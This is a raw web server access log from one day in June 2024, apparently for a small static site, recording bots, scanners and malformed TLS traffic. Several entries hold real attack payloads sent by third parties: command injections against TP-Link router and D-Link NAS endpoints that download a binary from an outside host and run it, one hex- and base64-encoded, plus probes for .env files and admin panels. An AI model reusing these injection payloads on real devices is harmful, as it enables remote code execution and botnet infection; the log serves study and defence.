64.226.90.208 - - [15/Jun/2024:06:55:59 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
161.35.29.212 - - [15/Jun/2024:06:56:06 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x817\xC1e\x03j\x8E\x83\xE9\x98\xB5+\xC3\x1B\xDC\x99M\xFA\x98\xF1D(m\xA4\x0F\x0F\xEC\xC9R\xC9B; )\x97R}UcF\xE1L\xA5\xE8\xF2\xAE-\xDD\xB2\xEC\x84aV\x06\x88r\x1A\xFD\xEC\xB3\xE0\x0C\x91@x\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
161.35.29.212 - - [15/Jun/2024:06:56:07 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB5+\x13^\x00[\xB98K\x87\x09\x17\xE3\x8D\xA6qc\xC0J\xC3jV\x1D\x9A\xBE\xD6\x1A\xFB\xCA(\xA7U \x8B%\xB4\x88,\xBAE\x84\x87\xD5\xC3yb\xD8\xFE\xDB\xBD\xF0\xD4\xFE\xEA5~\xDE-\x00n\x05\xA2\x86Sc\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
161.35.29.212 - - [15/Jun/2024:06:56:07 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03tL\xCE'\x9A\x1A\x00\xE0>.\xAC\xCD\x806F\xD6\xB1'\xA7\x10\x02\x8D\x1B\x8C\x1F\xC0\x84\x9EF\x18\xD5t \x22\xDC\xDE\x9E\xE4x~'\x95\xD0" 400 154 "-" "-"
123.60.68.42 - - [15/Jun/2024:07:03:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.8; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2847.88 Safari/537.36"
209.38.212.112 - - [15/Jun/2024:07:16:11 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
209.38.212.112 - - [15/Jun/2024:07:16:11 +0000] "GET /odinhttpcall1718435771 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.212.112 - - [15/Jun/2024:07:16:11 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
209.38.212.112 - - [15/Jun/2024:07:16:11 +0000] "POST /sdk HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.212.112 - - [15/Jun/2024:07:16:11 +0000] "GET /HNAP1 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.212.112 - - [15/Jun/2024:07:16:11 +0000] "GET /evox/about HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.212.112 - - [15/Jun/2024:07:16:12 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
209.38.212.112 - - [15/Jun/2024:07:16:12 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
165.22.76.52 - - [15/Jun/2024:07:16:13 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
164.92.142.144 - - [15/Jun/2024:07:16:13 +0000] "GET /solr/admin/info/system HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
165.22.66.194 - - [15/Jun/2024:07:16:13 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
46.101.137.243 - - [15/Jun/2024:07:16:13 +0000] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03\xBEM\xCE\x8D\xC9\x8A\x12\xA3j\x8B" 400 154 "-" "-"
164.92.142.144 - - [15/Jun/2024:07:16:13 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
165.22.76.52 - - [15/Jun/2024:07:16:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
149.50.103.48 - - [15/Jun/2024:07:21:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
222.186.13.132 - - [15/Jun/2024:07:22:01 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
222.186.13.132 - - [15/Jun/2024:07:22:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
222.186.13.132 - - [15/Jun/2024:07:22:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
92.249.48.237 - - [15/Jun/2024:07:22:14 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
222.186.13.132 - - [15/Jun/2024:07:22:23 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
222.186.13.132 - - [15/Jun/2024:07:22:28 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
222.186.13.132 - - [15/Jun/2024:07:22:46 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
222.186.13.132 - - [15/Jun/2024:07:22:57 +0000] "GET /.well-known/security.txt/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
92.249.48.237 - - [15/Jun/2024:07:24:06 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
161.35.29.98 - - [15/Jun/2024:07:29:09 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x19\xB9xj]\xF3\xC6\xC0F\xDF\xEE\xE922\xC3q\x8B\x92GU\xFA\xC6Y\xA3\xCA\x8A<\x9B\x0EZ\xB2" 400 154 "-" "-"
161.35.29.98 - - [15/Jun/2024:07:29:10 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD8\x81\xF1Jw)2Ge\x9D\x86\xA9\xE8\xF8\xB7\xD4\xFE\xC8\xD3\x9D\x9FP\x7F\xB2\xBF\xD0\x99\xC3\x8E\x80\xCB\xC3 Oa\x5C\x8Fp\xE1\x11\x03\x1B\xD6\xFD\x12t\xB0\x0B\x95\x85\xAE\x84\x9E]\x93.E\xB5\x11\xC8T\x012\x0B\xB5\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
161.35.29.98 - - [15/Jun/2024:07:29:10 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03)\x19^\xA7o\x7F\xCB\xC2\xCC\xFC7i\xD0\xD9\xA5\x15\xFDq\xF5\x93,\xC4u8\x0C\xAD\xF0" 400 154 "-" "-"
92.249.48.237 - - [15/Jun/2024:07:30:05 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
46.19.143.66 - - [15/Jun/2024:07:33:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:07:38:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
205.210.31.30 - - [15/Jun/2024:07:42:06 +0000] "GET /login HTTP/1.1" 301 166 "http://180.233.121.154:80/" "-"
172.168.41.52 - - [15/Jun/2024:07:46:45 +0000] "GET /actuator/health HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
149.50.103.48 - - [15/Jun/2024:07:54:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
43.133.77.208 - - [15/Jun/2024:08:03:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
115.231.78.12 - - [15/Jun/2024:08:12:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
115.231.78.12 - - [15/Jun/2024:08:14:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
149.50.103.48 - - [15/Jun/2024:08:17:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:08:24:57 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
104.152.52.18 - - [15/Jun/2024:08:31:26 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [15/Jun/2024:08:34:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
64.62.156.17 - - [15/Jun/2024:08:35:25 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB6\xA9w\x95\xEA6\xDC\x8D\x19\xDA\xFD\x94\xA2\xA5\xC0:x\x88" 400 154 "-" "-"
43.135.166.178 - - [15/Jun/2024:08:36:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
18.116.120.100 - - [15/Jun/2024:08:45:04 +0000] "GET http://httpbin.org/ip HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
18.116.120.100 - - [15/Jun/2024:08:45:05 +0000] "CONNECT hanisntsolo.github.io:443 HTTP/1.1" 400 154 "-" "-"
46.19.143.66 - - [15/Jun/2024:08:48:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
165.232.66.93 - - [15/Jun/2024:08:51:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
188.166.108.93 - - [15/Jun/2024:08:56:37 +0000] "\x16\x03\x01\x01\x0E\x01\x00\x01" 400 154 "-" "-"
149.50.103.48 - - [15/Jun/2024:09:00:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:09:01:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:09:15:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [15/Jun/2024:09:18:19 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [15/Jun/2024:09:25:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
149.50.103.48 - - [15/Jun/2024:09:41:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [15/Jun/2024:09:47:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [15/Jun/2024:09:56:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [15/Jun/2024:09:58:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:10:12:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:10:15:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:10:35:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
80.66.83.49 - - [15/Jun/2024:10:51:37 +0000] "\x04\x01\x00\x194eD\x18\x00" 400 154 "-" "-"
80.66.83.49 - - [15/Jun/2024:10:51:38 +0000] "\x05\x01\x00" 400 154 "-" "-"
80.66.83.49 - - [15/Jun/2024:10:51:43 +0000] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 400 154 "-" "-"
149.50.103.48 - - [15/Jun/2024:10:56:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.36 - - [15/Jun/2024:10:57:35 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
46.19.143.66 - - [15/Jun/2024:11:12:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:11:22:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
83.97.73.245 - - [15/Jun/2024:11:36:24 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
149.50.103.48 - - [15/Jun/2024:11:38:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:11:49:28 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:11:59:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:12:15:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [15/Jun/2024:12:27:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [15/Jun/2024:12:28:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:12:35:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.140.17.52 - - [15/Jun/2024:12:36:11 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
83.97.73.245 - - [15/Jun/2024:12:40:34 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.224.128.43 - - [15/Jun/2024:12:54:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [15/Jun/2024:12:56:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:13:02:00 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:13:18:48 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
91.92.255.15 - - [15/Jun/2024:13:38:35 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [15/Jun/2024:13:41:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [15/Jun/2024:13:41:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
168.76.20.229 - - [15/Jun/2024:13:48:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
168.76.20.229 - - [15/Jun/2024:13:48:21 +0000] "GET /assets/img/favicon/another/favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [15/Jun/2024:13:48:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [15/Jun/2024:13:48:22 +0000] "GET /assets/img/favicon/another/favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [15/Jun/2024:13:48:22 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [15/Jun/2024:13:48:23 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [15/Jun/2024:13:48:23 +0000] "GET /assets/js/beautifuljekyll.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [15/Jun/2024:13:48:24 +0000] "GET /assets/js/theme-switcher.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
149.50.103.48 - - [15/Jun/2024:13:52:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
79.137.65.46 - - [15/Jun/2024:13:53:40 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
185.191.127.212 - - [15/Jun/2024:13:58:28 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
50.80.208.149 - - [15/Jun/2024:14:06:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.148.10.174 - - [15/Jun/2024:14:07:38 +0000] "GET /cgi-bin/nas_sharing.cgi?cmd=15&passwd=&system=ZWNobwktZQkiXHg2M1x4NjRceDIwXHgyZlx4NzRceDZkXHg3MFx4M2JceDIwXHg3Mlx4NmRceDIwXHgyZFx4NzJceDY2XHgyMFx4NzNceDY4XHg2Ylx4M2JceDIwXHg3N1x4NjdceDY1XHg3NFx4MjBceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHgzNFx4MzVceDJlXHgzMVx4MzRceDM4XHgyZVx4MzFceDMwXHgyZVx4MzdceDM4XHgyZlx4NzNceDY4XHg2Ylx4MjBceDdjXHg3Y1x4MjBceDYzXHg3NVx4NzJceDZjXHgyMFx4MmRceDRmXHgyMFx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDM0XHgzNVx4MmVceDMxXHgzNFx4MzhceDJlXHgzMVx4MzBceDJlXHgzN1x4MzhceDJmXHg3M1x4NjhceDZiXHgyMFx4N2NceDdjXHgyMFx4NzRceDY2XHg3NFx4NzBceDIwXHgyZFx4NjdceDIwXHgyZFx4NzJceDIwXHg3M1x4NjhceDZiXHgyMFx4MzRceDM1XHgyZVx4MzFceDM0XHgzOFx4MmVceDMxXHgzMFx4MmVceDM3XHgzOFx4M2JceDIwXHg2M1x4NjhceDZkXHg2Zlx4NjRceDIwXHgyYlx4NzhceDIwXHg3M1x4NjhceDZiXHgzYlx4MjBceDJlXHgyZlx4NzNceDY4XHg2Ylx4MjBceDY0XHg2Y1x4NjlceDZlXHg2Ylx4M2JceDIwXHg3Mlx4NmRceDIwXHgyZFx4NzJceDY2XHgyMFx4NzNceDY4XHg2Ylx4M2IifHNo&user=messagebus HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
35.229.46.179 - - [15/Jun/2024:14:15:42 +0000] "GET /robots.txt HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
35.229.46.179 - - [15/Jun/2024:14:15:45 +0000] "GET / HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
35.229.46.179 - - [15/Jun/2024:14:16:35 +0000] "GET /robots.txt HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
35.229.46.179 - - [15/Jun/2024:14:16:38 +0000] "GET / HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
117.251.172.161 - - [15/Jun/2024:14:18:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.224.3.4 - - [15/Jun/2024:14:18:58 +0000] "CONNECT pro.ip-api.com:443 HTTP/1.1" 400 154 "-" "-"
185.224.3.4 - - [15/Jun/2024:14:18:59 +0000] "\x16\x03\x01\x01)\x01\x00\x01%\x03\x03q\x163b\x8A\xE6Av\x1B\x0F\xF8M\xD7\xACchJ\xF5\xC3+\xDA\xD4$\xAF\x92\xC8'\xFCi\x8B\xD1\xCB J\x8E\xF8x\xE8\xCA\x92\x8D\x16g\xEB\xAD\xA4:\xF9\xA6\x8E\xDB\xED@\x9F\xFF\xC0]w\x8A%\xC1Q\x10\x12*\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 154 "-" "-"
149.50.103.48 - - [15/Jun/2024:14:22:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:14:40:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.140.17.52 - - [15/Jun/2024:14:52:19 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
185.191.127.212 - - [15/Jun/2024:14:54:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
46.19.143.66 - - [15/Jun/2024:14:55:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:14:59:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
144.202.113.237 - - [15/Jun/2024:15:05:05 +0000] "HEAD /wordpress HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:05 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:06 +0000] "HEAD /wp HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:06 +0000] "HEAD /bc HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:06 +0000] "HEAD /bk HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:06 +0000] "HEAD /backup HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:07 +0000] "HEAD /old HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:07 +0000] "HEAD /new HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:07 +0000] "HEAD /main HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.202.113.237 - - [15/Jun/2024:15:05:07 +0000] "HEAD /home HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
188.166.212.111 - - [15/Jun/2024:15:06:22 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
188.166.212.111 - - [15/Jun/2024:15:06:22 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.50.103.48 - - [15/Jun/2024:15:21:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
199.45.154.21 - - [15/Jun/2024:15:25:11 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.154.21 - - [15/Jun/2024:15:25:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.21 - - [15/Jun/2024:15:25:20 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
149.50.103.48 - - [15/Jun/2024:15:35:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.244.36.200 - - [15/Jun/2024:15:36:21 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
46.174.191.29 - - [15/Jun/2024:15:36:40 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
45.148.10.174 - - [15/Jun/2024:15:36:41 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
54.254.162.138 - - [15/Jun/2024:15:47:31 +0000] "GET / HTTP/1.1" 301 166 "-" "undici"
149.50.103.48 - - [15/Jun/2024:15:52:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:16:05:34 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
109.205.213.198 - - [15/Jun/2024:16:06:15 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
46.19.143.66 - - [15/Jun/2024:16:07:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
